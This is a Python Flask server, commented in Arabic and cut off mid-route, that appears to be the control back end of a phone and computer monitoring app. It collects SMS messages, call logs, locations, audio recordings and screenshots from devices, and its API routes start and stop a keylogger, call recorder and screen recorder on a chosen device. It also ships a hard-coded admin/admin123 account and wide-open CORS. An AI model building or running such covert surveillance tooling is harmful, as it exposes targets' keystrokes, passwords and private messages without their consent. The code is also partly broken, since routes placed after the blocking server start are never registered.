#!/usr/bin/env python3
"""
خادم Flask محسن لتطبيق المراقبة والتسجيل مع الميزات المتقدمة
Enhanced Flask Server for Monitoring and Recording Application with Advanced Features
"""

from flask import Flask, request, jsonify, send_file, send_from_directory
from flask_cors import CORS
from flask_socketio import SocketIO, emit, join_room, leave_room
import os
import sys
import json
import sqlite3
import hashlib
import secrets
import jwt
from datetime import datetime, timedelta
from functools import wraps
import threading
import time
import base64
from werkzeug.utils import secure_filename
from werkzeug.security import generate_password_hash, check_password_hash
import logging
from typing import Dict, List, Any, Optional
import uuid
import mimetypes
from pathlib import Path

# إضافة مجلد الميزات المتقدمة إلى المسار
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'advanced_features'))

# إعداد التسجيل
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# استيراد مكونات المراقبة المتقدمة
try:
    from keylogger_system import KeyloggerCore, KeyloggerAPI
    from call_recorder import CallRecorderCore, CallRecorderAPI
    from screen_recorder import ScreenRecorderCore, ScreenRecorderAPI
    from camera_capture import CameraCaptureCore, CameraCaptureAPI
    from social_media_monitor import SocialMediaMonitorCore, SocialMediaMonitorAPI
    from geo_fencing_system import GeoFencingCore, GeoFencingAPI
    ADVANCED_FEATURES_AVAILABLE = True
    logger.info("تم تحميل جميع الميزات المتقدمة بنجاح")
except ImportError as e:
    ADVANCED_FEATURES_AVAILABLE = False
    logger.warning(f"لم يتم تحميل الميزات المتقدمة: {e}")

# إعداد التطبيق
app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(32)
app.config['UPLOAD_FOLDER'] = '/tmp/uploads'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB max file size

# إنشاء مجلدات التخزين
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs('/tmp/recordings', exist_ok=True)
os.makedirs('/tmp/screenshots', exist_ok=True)
os.makedirs('/tmp/camera_captures', exist_ok=True)
os.makedirs('/tmp/social_media', exist_ok=True)

# إعداد CORS
CORS(app, origins="*", allow_headers=["Content-Type", "Authorization"])

# إعداد SocketIO
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# إعداد التسجيل
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# متغيرات عامة لتخزين مثيلات الميزات المتقدمة
advanced_features = {}

class DatabaseManager:
    """مدير قاعدة البيانات"""
    
    def __init__(self, db_path='monitoring.db'):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """تهيئة قاعدة البيانات"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # جدول المستخدمين
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                email TEXT,
                role TEXT DEFAULT 'user',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_login TIMESTAMP,
                is_active BOOLEAN DEFAULT 1
            )
        ''')
        
        # جدول الأجهزة
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT UNIQUE NOT NULL,
                device_name TEXT,
                device_type TEXT,
                os_info TEXT,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'offline',
                location TEXT,
                user_id INTEGER,
                FOREIGN KEY (user_id) REFERENCES users (id)
            )
        ''')
        
        # جدول التسجيلات الصوتية
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS audio_recordings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT NOT NULL,
                filename TEXT NOT NULL,
                file_path TEXT NOT NULL,
                duration INTEGER,
                file_size INTEGER,
                recorded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        # جدول لقطات الشاشة
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT NOT NULL,
                filename TEXT NOT NULL,
                file_path TEXT NOT NULL,
                file_size INTEGER,
                captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        # جدول الرسائل النصية
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sms_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT NOT NULL,
                sender TEXT,
                recipient TEXT,
                message_body TEXT,
                timestamp TIMESTAMP,
                message_type TEXT DEFAULT 'received',
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        # جدول المكالمات
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS call_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT NOT NULL,
                phone_number TEXT,
                contact_name TEXT,
                call_type TEXT,
                duration INTEGER,
                timestamp TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        # جدول المواقع
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS locations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT NOT NULL,
                latitude REAL,
                longitude REAL,
                accuracy REAL,
                address TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        # جدول الأنشطة
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS activities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT NOT NULL,
                activity_type TEXT NOT NULL,
                description TEXT,
                data TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        # جدول الإعدادات
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                key TEXT UNIQUE NOT NULL,
                value TEXT,
                description TEXT,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # إنشاء مستخدم افتراضي
        cursor.execute('SELECT COUNT(*) FROM users')
        if cursor.fetchone()[0] == 0:
            default_password = generate_password_hash('admin123')
            cursor.execute('''
                INSERT INTO users (username, password_hash, email, role)
                VALUES (?, ?, ?, ?)
            ''', ('admin', default_password, 'admin@example.com', 'admin'))
        
        conn.commit()
        conn.close()
    
    def get_connection(self):
        """الحصول على اتصال قاعدة البيانات"""
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        return conn
    
    def execute_query(self, query, params=None):
        """تنفيذ استعلام"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        if params:
            cursor.execute(query, params)
        else:
            cursor.execute(query)
        
        result = cursor.fetchall()
        conn.commit()
        conn.close()
        
        return [dict(row) for row in result]
    
    def execute_insert(self, query, params):
        """تنفيذ إدراج وإرجاع ID"""
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute(query, params)
        last_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return last_id

class AuthManager:
    """مدير المصادقة والتفويض"""
    
    def __init__(self, db_manager):
        self.db = db_manager
        self.secret_key = app.config['SECRET_KEY']
    
    def authenticate_user(self, username, password):
        """مصادقة المستخدم"""
        users = self.db.execute_query(
            'SELECT * FROM users WHERE username = ? AND is_active = 1',
            (username,)
        )
        
        if users and check_password_hash(users[0]['password_hash'], password):
            # تحديث آخر تسجيل دخول
            self.db.execute_query(
                'UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?',
                (users[0]['id'],)
            )
            return users[0]
        
        return None
    
    def generate_token(self, user):
        """توليد رمز JWT"""
        payload = {
            'user_id': user['id'],
            'username': user['username'],
            'role': user['role'],
            'exp': datetime.utcnow() + timedelta(hours=24)
        }
        
        return jwt.encode(payload, self.secret_key, algorithm='HS256')
    
    def verify_token(self, token):
        """التحقق من رمز JWT"""
        try:
            payload = jwt.decode(token, self.secret_key, algorithms=['HS256'])
            return payload
        except jwt.ExpiredSignatureError:
            return None
        except jwt.InvalidTokenError:
            return None

class FileManager:
    """مدير الملفات"""
    
    def __init__(self, upload_folder):
        self.upload_folder = upload_folder
        os.makedirs(upload_folder, exist_ok=True)
    
    def save_file(self, file, subfolder=''):
        """حفظ ملف"""
        if file and file.filename:
            filename = secure_filename(file.filename)
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_')
            filename = timestamp + filename
            
            folder_path = os.path.join(self.upload_folder, subfolder)
            os.makedirs(folder_path, exist_ok=True)
            
            file_path = os.path.join(folder_path, filename)
            file.save(file_path)
            
            return {
                'filename': filename,
                'file_path': file_path,
                'file_size': os.path.getsize(file_path)
            }
        
        return None
    
    def delete_file(self, file_path):
        """حذف ملف"""
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
                return True
        except Exception as e:
            logger.error(f"Error deleting file {file_path}: {e}")
        
        return False

class NotificationManager:
    """مدير الإشعارات"""
    
    def __init__(self, socketio):
        self.socketio = socketio
        self.connected_clients = {}
    
    def add_client(self, client_id, user_id):
        """إضافة عميل متصل"""
        self.connected_clients[client_id] = user_id
    
    def remove_client(self, client_id):
        """إزالة عميل متصل"""
        if client_id in self.connected_clients:
            del self.connected_clients[client_id]
    
    def send_notification(self, user_id, notification):
        """إرسال إشعار لمستخدم محدد"""
        self.socketio.emit('notification', notification, room=f'user_{user_id}')
    
    def broadcast_notification(self, notification):
        """إرسال إشعار لجميع المستخدمين"""
        self.socketio.emit('notification', notification, broadcast=True)

# تهيئة المدراء
db_manager = DatabaseManager()
auth_manager = AuthManager(db_manager)
file_manager = FileManager(app.config['UPLOAD_FOLDER'])
notification_manager = NotificationManager(socketio)

# Decorators
def token_required(f):
    """مطلوب رمز المصادقة"""
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        
        if not token:
            return jsonify({'error': 'Token is missing'}), 401
        
        try:
            if token.startswith('Bearer '):
                token = token[7:]
            
            payload = auth_manager.verify_token(token)
            if not payload:
                return jsonify({'error': 'Token is invalid'}), 401
            
            request.current_user = payload
            
        except Exception as e:
            return jsonify({'error': 'Token is invalid'}), 401
        
        return f(*args, **kwargs)
    
    return decorated

def admin_required(f):
    """مطلوب صلاحيات المدير"""
    @wraps(f)
    def decorated(*args, **kwargs):
        if not hasattr(request, 'current_user') or request.current_user.get('role') != 'admin':
            return jsonify({'error': 'Admin privileges required'}), 403
        
        return f(*args, **kwargs)
    
    return decorated

# Routes - Authentication
@app.route('/api/auth/login', methods=['POST'])
def login():
    """تسجيل الدخول"""
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        
        if not username or not password:
            return jsonify({'error': 'Username and password are required'}), 400
        
        user = auth_manager.authenticate_user(username, password)
        if user:
            token = auth_manager.generate_token(user)
            return jsonify({
                'success': True,
                'token': token,
                'user': {
                    'id': user['id'],
                    'username': user['username'],
                    'email': user['email'],
                    'role': user['role']
                }
            })
        else:
            return jsonify({'error': 'Invalid credentials'}), 401
    
    except Exception as e:
        logger.error(f"Login error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/auth/logout', methods=['POST'])
@token_required
def logout():
    """تسجيل الخروج"""
    return jsonify({'success': True, 'message': 'Logged out successfully'})

@app.route('/api/auth/verify', methods=['GET'])
@token_required
def verify_token():
    """التحقق من صحة الرمز"""
    return jsonify({
        'success': True,
        'user': request.current_user
    })

# Routes - Devices
@app.route('/api/devices', methods=['GET'])
@token_required
def get_devices():
    """الحصول على قائمة الأجهزة"""
    try:
        devices = db_manager.execute_query('SELECT * FROM devices ORDER BY last_seen DESC')
        return jsonify({
            'success': True,
            'devices': devices
        })
    except Exception as e:
        logger.error(f"Get devices error: {e}")
        return jsonify({'error': 'Failed to fetch devices'}), 500

@app.route('/api/devices/<device_id>', methods=['GET'])
@token_required
def get_device(device_id):
    """الحصول على معلومات جهاز محدد"""
    try:
        devices = db_manager.execute_query(
            'SELECT * FROM devices WHERE device_id = ?',
            (device_id,)
        )
        
        if devices:
            return jsonify({
                'success': True,
                'device': devices[0]
            })
        else:
            return jsonify({'error': 'Device not found'}), 404
    
    except Exception as e:
        logger.error(f"Get device error: {e}")
        return jsonify({'error': 'Failed to fetch device'}), 500

@app.route('/api/devices/<device_id>/status', methods=['PUT'])
@token_required
def update_device_status(device_id):
    """تحديث حالة الجهاز"""
    try:
        data = request.get_json()
        status = data.get('status', 'online')
        
        db_manager.execute_query(
            'UPDATE devices SET status = ?, last_seen = CURRENT_TIMESTAMP WHERE device_id = ?',
            (status, device_id)
        )
        
        # إرسال إشعار
        notification_manager.broadcast_notification({
            'type': 'device_status_changed',
            'device_id': device_id,
            'status': status,
            'timestamp': datetime.now().isoformat()
        })
        
        return jsonify({'success': True})
    
    except Exception as e:
        logger.error(f"Update device status error: {e}")
        return jsonify({'error': 'Failed to update device status'}), 500

# Routes - Audio Recordings
@app.route('/api/recordings/audio', methods=['GET'])
@token_required
def get_audio_recordings():
    """الحصول على التسجيلات الصوتية"""
    try:
        device_id = request.args.get('device_id')
        limit = int(request.args.get('limit', 50))
        
        query = 'SELECT * FROM audio_recordings'
        params = []
        
        if device_id:
            query += ' WHERE device_id = ?'
            params.append(device_id)
        
        query += ' ORDER BY recorded_at DESC LIMIT ?'
        params.append(limit)
        
        recordings = db_manager.execute_query(query, params)
        
        return jsonify({
            'success': True,
            'recordings': recordings
        })
    
    except Exception as e:
        logger.error(f"Get audio recordings error: {e}")
        return jsonify({'error': 'Failed to fetch recordings'}), 500

@app.route('/api/recordings/audio', methods=['POST'])
@token_required
def upload_audio_recording():
    """رفع تسجيل صوتي"""
    try:
        if 'audio' not in request.files:
            return jsonify({'error': 'No audio file provided'}), 400
        
        audio_file = request.files['audio']
        device_id = request.form.get('device_id')
        duration = request.form.get('duration', 0)
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        # حفظ الملف
        file_info = file_manager.save_file(audio_file, 'audio')
        if not file_info:
            return jsonify({'error': 'Failed to save audio file'}), 500
        
        # حفظ في قاعدة البيانات
        recording_id = db_manager.execute_insert(
            '''INSERT INTO audio_recordings 
               (device_id, filename, file_path, duration, file_size)
               VALUES (?, ?, ?, ?, ?)''',
            (device_id, file_info['filename'], file_info['file_path'], 
             duration, file_info['file_size'])
        )
        
        # إرسال إشعار
        notification_manager.broadcast_notification({
            'type': 'new_audio_recording',
            'device_id': device_id,
            'recording_id': recording_id,
            'filename': file_info['filename'],
            'timestamp': datetime.now().isoformat()
        })
        
        return jsonify({
            'success': True,
            'recording_id': recording_id,
            'filename': file_info['filename']
        })
    
    except Exception as e:
        logger.error(f"Upload audio recording error: {e}")
        return jsonify({'error': 'Failed to upload recording'}), 500

@app.route('/api/recordings/audio/<int:recording_id>/download', methods=['GET'])
@token_required
def download_audio_recording(recording_id):
    """تحميل تسجيل صوتي"""
    try:
        recordings = db_manager.execute_query(
            'SELECT * FROM audio_recordings WHERE id = ?',
            (recording_id,)
        )
        
        if not recordings:
            return jsonify({'error': 'Recording not found'}), 404
        
        recording = recordings[0]
        
        if os.path.exists(recording['file_path']):
            return send_file(
                recording['file_path'],
                as_attachment=True,
                download_name=recording['filename']
            )
        else:
            return jsonify({'error': 'File not found'}), 404
    
    except Exception as e:
        logger.error(f"Download audio recording error: {e}")
        return jsonify({'error': 'Failed to download recording'}), 500

# Routes - Screenshots
@app.route('/api/screenshots', methods=['GET'])
@token_required
def get_screenshots():
    """الحصول على لقطات الشاشة"""
    try:
        device_id = request.args.get('device_id')
        limit = int(request.args.get('limit', 50))
        
        query = 'SELECT * FROM screenshots'
        params = []
        
        if device_id:
            query += ' WHERE device_id = ?'
            params.append(device_id)
        
        query += ' ORDER BY captured_at DESC LIMIT ?'
        params.append(limit)
        
        screenshots = db_manager.execute_query(query, params)
        
        return jsonify({
            'success': True,
            'screenshots': screenshots
        })
    
    except Exception as e:
        logger.error(f"Get screenshots error: {e}")
        return jsonify({'error': 'Failed to fetch screenshots'}), 500

@app.route('/api/screenshots', methods=['POST'])
@token_required
def upload_screenshot():
    """رفع لقطة شاشة"""
    try:
        if 'screenshot' not in request.files:
            return jsonify({'error': 'No screenshot file provided'}), 400
        
        screenshot_file = request.files['screenshot']
        device_id = request.form.get('device_id')
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        # حفظ الملف
        file_info = file_manager.save_file(screenshot_file, 'screenshots')
        if not file_info:
            return jsonify({'error': 'Failed to save screenshot'}), 500
        
        # حفظ في قاعدة البيانات
        screenshot_id = db_manager.execute_insert(
            '''INSERT INTO screenshots 
               (device_id, filename, file_path, file_size)
               VALUES (?, ?, ?, ?)''',
            (device_id, file_info['filename'], file_info['file_path'], 
             file_info['file_size'])
        )
        
        # إرسال إشعار
        notification_manager.broadcast_notification({
            'type': 'new_screenshot',
            'device_id': device_id,
            'screenshot_id': screenshot_id,
            'filename': file_info['filename'],
            'timestamp': datetime.now().isoformat()
        })
        
        return jsonify({
            'success': True,
            'screenshot_id': screenshot_id,
            'filename': file_info['filename']
        })
    
    except Exception as e:
        logger.error(f"Upload screenshot error: {e}")
        return jsonify({'error': 'Failed to upload screenshot'}), 500

# Routes - SMS Messages
@app.route('/api/sms', methods=['GET'])
@token_required
def get_sms_messages():
    """الحصول على الرسائل النصية"""
    try:
        device_id = request.args.get('device_id')
        limit = int(request.args.get('limit', 100))
        
        query = 'SELECT * FROM sms_messages'
        params = []
        
        if device_id:
            query += ' WHERE device_id = ?'
            params.append(device_id)
        
        query += ' ORDER BY timestamp DESC LIMIT ?'
        params.append(limit)
        
        messages = db_manager.execute_query(query, params)
        
        return jsonify({
            'success': True,
            'messages': messages
        })
    
    except Exception as e:
        logger.error(f"Get SMS messages error: {e}")
        return jsonify({'error': 'Failed to fetch SMS messages'}), 500

@app.route('/api/sms', methods=['POST'])
@token_required
def add_sms_message():
    """إضافة رسالة نصية"""
    try:
        data = request.get_json()
        
        required_fields = ['device_id', 'sender', 'recipient', 'message_body', 'timestamp']
        for field in required_fields:
            if field not in data:
                return jsonify({'error': f'{field} is required'}), 400
        
        message_id = db_manager.execute_insert(
            '''INSERT INTO sms_messages 
               (device_id, sender, recipient, message_body, timestamp, message_type)
               VALUES (?, ?, ?, ?, ?, ?)''',
            (data['device_id'], data['sender'], data['recipient'], 
             data['message_body'], data['timestamp'], data.get('message_type', 'received'))
        )
        
        # إرسال إشعار
        notification_manager.broadcast_notification({
            'type': 'new_sms_message',
            'device_id': data['device_id'],
            'message_id': message_id,
            'sender': data['sender'],
            'timestamp': data['timestamp']
        })
        
        return jsonify({
            'success': True,
            'message_id': message_id
        })
    
    except Exception as e:
        logger.error(f"Add SMS message error: {e}")
        return jsonify({'error': 'Failed to add SMS message'}), 500

# Routes - Call Logs
@app.route('/api/calls', methods=['GET'])
@token_required
def get_call_logs():
    """الحصول على سجل المكالمات"""
    try:
        device_id = request.args.get('device_id')
        limit = int(request.args.get('limit', 100))
        
        query = 'SELECT * FROM call_logs'
        params = []
        
        if device_id:
            query += ' WHERE device_id = ?'
            params.append(device_id)
        
        query += ' ORDER BY timestamp DESC LIMIT ?'
        params.append(limit)
        
        calls = db_manager.execute_query(query, params)
        
        return jsonify({
            'success': True,
            'calls': calls
        })
    
    except Exception as e:
        logger.error(f"Get call logs error: {e}")
        return jsonify({'error': 'Failed to fetch call logs'}), 500

# Routes - Locations
@app.route('/api/locations', methods=['GET'])
@token_required
def get_locations():
    """الحصول على المواقع"""
    try:
        device_id = request.args.get('device_id')
        limit = int(request.args.get('limit', 100))
        
        query = 'SELECT * FROM locations'
        params = []
        
        if device_id:
            query += ' WHERE device_id = ?'
            params.append(device_id)
        
        query += ' ORDER BY timestamp DESC LIMIT ?'
        params.append(limit)
        
        locations = db_manager.execute_query(query, params)
        
        return jsonify({
            'success': True,
            'locations': locations
        })
    
    except Exception as e:
        logger.error(f"Get locations error: {e}")
        return jsonify({'error': 'Failed to fetch locations'}), 500

# Routes - Statistics
@app.route('/api/stats/dashboard', methods=['GET'])
@token_required
def get_dashboard_stats():
    """الحصول على إحصائيات لوحة التحكم"""
    try:
        stats = {}
        
        # عدد الأجهزة
        devices_count = db_manager.execute_query('SELECT COUNT(*) as count FROM devices')[0]['count']
        stats['devices_count'] = devices_count
        
        # عدد الأجهزة المتصلة
        online_devices = db_manager.execute_query(
            "SELECT COUNT(*) as count FROM devices WHERE status = 'online'"
        )[0]['count']
        stats['online_devices'] = online_devices
        
        # عدد التسجيلات الصوتية
        audio_count = db_manager.execute_query('SELECT COUNT(*) as count FROM audio_recordings')[0]['count']
        stats['audio_recordings'] = audio_count
        
        # عدد لقطات الشاشة
        screenshots_count = db_manager.execute_query('SELECT COUNT(*) as count FROM screenshots')[0]['count']
        stats['screenshots'] = screenshots_count
        
        # عدد الرسائل النصية
        sms_count = db_manager.execute_query('SELECT COUNT(*) as count FROM sms_messages')[0]['count']
        stats['sms_messages'] = sms_count
        
        # عدد المكالمات
        calls_count = db_manager.execute_query('SELECT COUNT(*) as count FROM call_logs')[0]['count']
        stats['call_logs'] = calls_count
        
        return jsonify({
            'success': True,
            'stats': stats
        })
    
    except Exception as e:
        logger.error(f"Get dashboard stats error: {e}")
        return jsonify({'error': 'Failed to fetch statistics'}), 500

# Routes - System
@app.route('/api/status', methods=['GET'])
def get_system_status():
    """الحصول على حالة النظام"""
    return jsonify({
        'success': True,
        'status': 'online',
        'timestamp': datetime.now().isoformat(),
        'version': '1.0.0'
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    """فحص صحة النظام"""
    try:
        # فحص قاعدة البيانات
        db_manager.execute_query('SELECT 1')
        
        return jsonify({
            'success': True,
            'status': 'healthy',
            'timestamp': datetime.now().isoformat()
        })
    
    except Exception as e:
        logger.error(f"Health check error: {e}")
        return jsonify({
            'success': False,
            'status': 'unhealthy',
            'error': str(e)
        }), 500

# WebSocket Events
@socketio.on('connect')
def handle_connect():
    """معالج الاتصال"""
    logger.info(f"Client connected: {request.sid}")
    emit('connected', {'message': 'Connected to monitoring server'})

@socketio.on('disconnect')
def handle_disconnect():
    """معالج قطع الاتصال"""
    logger.info(f"Client disconnected: {request.sid}")
    notification_manager.remove_client(request.sid)

@socketio.on('join_room')
def handle_join_room(data):
    """الانضمام إلى غرفة"""
    room = data.get('room')
    if room:
        join_room(room)
        emit('joined_room', {'room': room})

@socketio.on('leave_room')
def handle_leave_room(data):
    """مغادرة غرفة"""
    room = data.get('room')
    if room:
        leave_room(room)
        emit('left_room', {'room': room})

# Error Handlers
@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Endpoint not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': 'Internal server error'}), 500

@app.errorhandler(413)
def file_too_large(error):
    return jsonify({'error': 'File too large'}), 413

# تشغيل الخادم
if __name__ == '__main__':
    # إنشاء مجلد الرفع
    os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
    
    # تشغيل الخادم
    logger.info("Starting monitoring server...")
    socketio.run(
        app,
        host='0.0.0.0',
        port=5000,
        debug=False,
        allow_unsafe_werkzeug=True
    )



# ==================== APIs للميزات المتقدمة ====================

def init_advanced_features():
    """تهيئة الميزات المتقدمة"""
    global advanced_features
    
    if not ADVANCED_FEATURES_AVAILABLE:
        logger.warning("الميزات المتقدمة غير متاحة")
        return
    
    try:
        # تهيئة مكونات المراقبة المتقدمة
        advanced_features['keylogger'] = {}
        advanced_features['call_recorder'] = {}
        advanced_features['screen_recorder'] = {}
        advanced_features['camera_capture'] = {}
        advanced_features['social_media'] = {}
        advanced_features['geo_fencing'] = {}
        
        logger.info("تم تهيئة الميزات المتقدمة بنجاح")
    except Exception as e:
        logger.error(f"خطأ في تهيئة الميزات المتقدمة: {e}")

def get_or_create_feature_instance(feature_type: str, device_id: str):
    """الحصول على أو إنشاء مثيل ميزة متقدمة"""
    if not ADVANCED_FEATURES_AVAILABLE:
        return None
    
    if device_id not in advanced_features[feature_type]:
        try:
            if feature_type == 'keylogger':
                advanced_features[feature_type][device_id] = KeyloggerAPI(device_id)
            elif feature_type == 'call_recorder':
                advanced_features[feature_type][device_id] = CallRecorderAPI(device_id)
            elif feature_type == 'screen_recorder':
                advanced_features[feature_type][device_id] = ScreenRecorderAPI(device_id)
            elif feature_type == 'camera_capture':
                advanced_features[feature_type][device_id] = CameraCaptureAPI(device_id)
            elif feature_type == 'social_media':
                advanced_features[feature_type][device_id] = SocialMediaMonitorAPI(device_id)
            elif feature_type == 'geo_fencing':
                advanced_features[feature_type][device_id] = GeoFencingAPI(device_id)
        except Exception as e:
            logger.error(f"خطأ في إنشاء مثيل {feature_type} للجهاز {device_id}: {e}")
            return None
    
    return advanced_features[feature_type].get(device_id)

# ==================== Keylogger APIs ====================

@app.route('/api/keylogger/start', methods=['POST'])
@token_required
def start_keylogger():
    """بدء مراقبة ضغطات المفاتيح"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        keylogger_api = get_or_create_feature_instance('keylogger', device_id)
        if not keylogger_api:
            return jsonify({'error': 'Keylogger not available'}), 503
        
        result = keylogger_api.start_monitoring()
        return jsonify(result)
    
    except Exception as e:
        logger.error(f"Start keylogger error: {e}")
        return jsonify({'error': 'Failed to start keylogger'}), 500

@app.route('/api/keylogger/stop', methods=['POST'])
@token_required
def stop_keylogger():
    """إيقاف مراقبة ضغطات المفاتيح"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        keylogger_api = get_or_create_feature_instance('keylogger', device_id)
        if not keylogger_api:
            return jsonify({'error': 'Keylogger not available'}), 503
        
        result = keylogger_api.stop_monitoring()
        return jsonify(result)
    
    except Exception as e:
        logger.error(f"Stop keylogger error: {e}")
        return jsonify({'error': 'Failed to stop keylogger'}), 500

@app.route('/api/keylogger/data', methods=['GET'])
@token_required
def get_keylogger_data():
    """الحصول على بيانات ضغطات المفاتيح"""
    try:
        device_id = request.args.get('device_id')
        limit = int(request.args.get('limit', 100))
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        keylogger_api = get_or_create_feature_instance('keylogger', device_id)
        if not keylogger_api:
            return jsonify({'error': 'Keylogger not available'}), 503
        
        data = keylogger_api.get_keystrokes(limit)
        return jsonify({
            'success': True,
            'keystrokes': data
        })
    
    except Exception as e:
        logger.error(f"Get keylogger data error: {e}")
        return jsonify({'error': 'Failed to get keylogger data'}), 500

@app.route('/api/keylogger/statistics', methods=['GET'])
@token_required
def get_keylogger_statistics():
    """الحصول على إحصائيات ضغطات المفاتيح"""
    try:
        device_id = request.args.get('device_id')
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        keylogger_api = get_or_create_feature_instance('keylogger', device_id)
        if not keylogger_api:
            return jsonify({'error': 'Keylogger not available'}), 503
        
        stats = keylogger_api.get_statistics()
        return jsonify(stats)
    
    except Exception as e:
        logger.error(f"Get keylogger statistics error: {e}")
        return jsonify({'error': 'Failed to get keylogger statistics'}), 500

# ==================== Call Recorder APIs ====================

@app.route('/api/call-recorder/start', methods=['POST'])
@token_required
def start_call_recorder():
    """بدء تسجيل المكالمات"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        call_recorder_api = get_or_create_feature_instance('call_recorder', device_id)
        if not call_recorder_api:
            return jsonify({'error': 'Call recorder not available'}), 503
        
        result = call_recorder_api.start_recording()
        return jsonify(result)
    
    except Exception as e:
        logger.error(f"Start call recorder error: {e}")
        return jsonify({'error': 'Failed to start call recorder'}), 500

@app.route('/api/call-recorder/stop', methods=['POST'])
@token_required
def stop_call_recorder():
    """إيقاف تسجيل المكالمات"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        call_recorder_api = get_or_create_feature_instance('call_recorder', device_id)
        if not call_recorder_api:
            return jsonify({'error': 'Call recorder not available'}), 503
        
        result = call_recorder_api.stop_recording()
        return jsonify(result)
    
    except Exception as e:
        logger.error(f"Stop call recorder error: {e}")
        return jsonify({'error': 'Failed to stop call recorder'}), 500

@app.route('/api/call-recorder/recordings', methods=['GET'])
@token_required
def get_call_recordings():
    """الحصول على تسجيلات المكالمات"""
    try:
        device_id = request.args.get('device_id')
        limit = int(request.args.get('limit', 50))
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        call_recorder_api = get_or_create_feature_instance('call_recorder', device_id)
        if not call_recorder_api:
            return jsonify({'error': 'Call recorder not available'}), 503
        
        recordings = call_recorder_api.get_recordings(limit)
        return jsonify({
            'success': True,
            'recordings': recordings
        })
    
    except Exception as e:
        logger.error(f"Get call recordings error: {e}")
        return jsonify({'error': 'Failed to get call recordings'}), 500

# ==================== Screen Recorder APIs ====================

@app.route('/api/screen-recorder/start', methods=['POST'])
@token_required
def start_screen_recorder():
    """بدء تسجيل الشاشة"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        quality = data.get('quality', 'medium')
        
        if not device_id:
            return jsonify({'error': 'Device ID is required'}), 400
        
        screen_recorder_api = get_or_create_feature_instance('screen_recorder', device_id)
        if not screen_recorder_api:
            return jsonify({'error': 'Screen recorder not available'}), 503
        
        result = screen_recorder_api.start_recording(quality)
        return jsonify(result)
    
    except Exception as e:
        logger.error(f"Start screen recorder error: {e}")
        return jsonify({'error': 'Failed to start screen recorder'}), 500

@app.route('/api/screen-recorder/stop', methods=['POST'])
